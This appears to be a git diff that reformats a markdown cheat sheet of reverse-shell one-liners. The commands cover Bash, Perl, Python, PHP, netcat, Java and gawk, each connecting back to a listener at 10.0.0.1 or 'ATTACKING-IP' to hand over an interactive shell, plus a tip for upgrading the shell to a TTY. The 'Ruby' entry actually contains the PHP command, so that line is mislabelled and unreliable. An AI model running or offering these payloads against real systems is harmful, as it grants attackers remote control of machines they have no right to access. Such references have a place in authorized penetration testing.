@@ -14,29 +14,50 @@ To setup a listening instance, enter the following:
 
 To connect back to a listening netcat instance, enter the following:
 
-- Bash: ```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```
+- Bash:
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
 
-- PERL: ```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+- PERL:
+```perl
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
-- PERL Windows 1: ```perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'```
+- PERL Windows 1:
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
 
-- Python: ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
+- Python:
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-- PHP: ```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```
+- PHP:
+```php
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
-- Ruby: ```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```
+- Ruby:
+```ruby
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
-- Netcat: ```nc -e /bin/sh 10.0.0.1 1234```
+- Netcat:
+```bash
+nc -e /bin/sh 10.0.0.1 1234
+```
 
 - Java:
-```
+```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
 - Gawk Reverse Shell:
-```
+```bash
 #!/usr/bin/gawk -f
 
 BEGIN {
@@ -60,7 +81,7 @@ BEGIN {
 ```
 
 - Spawning interactive reverse shells with TTY:
-```
+```bash
 # In reverse shell 
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z
